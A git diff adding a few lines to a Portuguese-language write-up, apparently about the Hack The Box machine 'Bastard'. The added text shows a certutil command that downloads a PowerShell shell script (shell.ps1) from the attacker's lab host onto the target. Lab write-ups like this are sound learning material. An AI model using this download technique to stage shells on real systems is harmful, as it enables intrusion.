@@ -78,3 +78,11 @@ AHhh, lembrando que eu ja dei uma verificada rapidas nos arquivos encontrados no
 
 ![6.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/6.jpg)
 
+Consegui usando o certutil
+
+`certutil -urlcache -split -f http://10.10.14.36/shell.ps1 shell.ps1`
+
+![7.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/7.jpg)
+
+
+
